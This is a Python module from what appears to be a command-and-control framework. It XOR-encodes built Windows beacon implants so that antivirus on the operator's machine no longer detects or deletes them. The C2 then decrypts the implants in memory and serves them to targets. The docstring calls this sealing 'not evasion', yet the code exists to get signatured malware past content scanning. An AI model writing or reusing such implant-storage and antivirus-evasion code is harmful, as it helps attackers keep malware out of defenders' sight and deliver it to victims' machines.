"""beacon_artifacts.py — keep the plaintext beacon off the operator's disk.

The problem this fixes is not theoretical. Building the Windows beacon writes
``beacon.pe`` and ``beacon.bin`` in the clear, and an on-access antivirus
deletes or blocks them on the OPERATOR's machine — measured on this project:
the PE is content-signatured (a copy with a different hash and a stripped copy
are blocked too), and after one execution attempt the file was gone from the
build directory. A build that quarantines its own artefacts is a build the
operator cannot trust.

The fix is at-rest sealing, not evasion: the bytes are XOR-encoded with a
random 32-byte key that never leaves ``data/`` and that only the C2 (and the
operator's own tooling) uses to serve them. There is no new obfuscation of the
payload, no packing, no change to what the target receives — the delivery
routes decrypt in memory and hand back the SAME bytes they always served.

Two properties are deliberate:

* **backwards compatible** — a plaintext artefact that is already there is
  read normally, so an existing install keeps working;
* **fail closed for the writer, fail open for the reader** — a missing key is
  regenerated, but a corrupt sealed file returns ``None`` instead of garbage,
  and the route answers 404 rather than serving something unverified.

``PHANTOM_KEEP_ARTIFACTS=1`` disables sealing (debugging, or a CI job that
asserts on the plaintext file).
"""

from __future__ import annotations

import os
import secrets
from pathlib import Path
from typing import Optional

SUFFIX = ".enc"
ENV_KEEP = "PHANTOM_KEEP_ARTIFACTS"
ENV_KEY = "PHANTOM_ARTIFACT_KEY"

_KEY_NAME = ".artifact_key"
_KEY_BYTES = 32


def enabled() -> bool:
    """Sealing is on unless the operator explicitly opts out."""
    return str(os.environ.get(ENV_KEEP, "")).strip().lower() in ("", "0", "false",
                                                                 "no", "off")


def _key_path(for_path: Path) -> Path:
    return Path(for_path).parent / _KEY_NAME


def _load_key(for_path: Path) -> bytes:
    """The share key for this directory, created on first use.

    It lives next to the artefacts rather than in ``data/`` on purpose: the
    sealed file and its key are useless apart, and keeping them in one place
    means copying the payload folder to another box keeps working.
    """
    path = _key_path(for_path)
    override = os.environ.get(ENV_KEY, "").strip()
    if override:
        return override.encode("utf-8")
    try:
        data = path.read_bytes()
        if len(data) >= 16:
            return data
    except OSError:
        pass
    key = secrets.token_bytes(_KEY_BYTES)
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(key)
        try:
            os.chmod(path, 0o600)
        except OSError:
            pass
    except OSError:
        pass
    return key


def _xor(data: bytes, key: bytes) -> bytes:
    if not key:
        return data
    return bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data))


def sealed_path(path: str | Path) -> Path:
    return Path(str(path) + SUFFIX)


def present(path: str | Path) -> bool:
    """Is the artefact available, sealed or not?"""
    path = Path(path)
    return path.is_file() or sealed_path(path).is_file()


def seal(path: str | Path) -> bool:
    """Encode ``path`` in place (``path.enc``) and remove the plaintext.

    Returns True when something was sealed or already sealed. A missing file
    is False, not an error: the caller decides whether that matters.
    """
    path = Path(path)
    if not path.is_file():
        return sealed_path(path).is_file()
    if not enabled():
        return False
    key = _load_key(path)
    target = sealed_path(path)
    tmp = target.with_suffix(target.suffix + ".tmp")
    tmp.write_bytes(_xor(path.read_bytes(), key))
    os.replace(tmp, target)
    path.unlink()          # after the sealed copy is durable on disk
    return True


def payload(path: str | Path) -> Optional[bytes]:
    """The plaintext bytes of an artefact, from disk or from its seal."""
    path = Path(path)
    try:
        if path.is_file():
            return path.read_bytes()
        sealed = sealed_path(path)
        if sealed.is_file():
            return _xor(sealed.read_bytes(), _load_key(path))
    except OSError:
        return None
    return None


def size(path: str | Path) -> int:
    return len(payload(path) or b"")
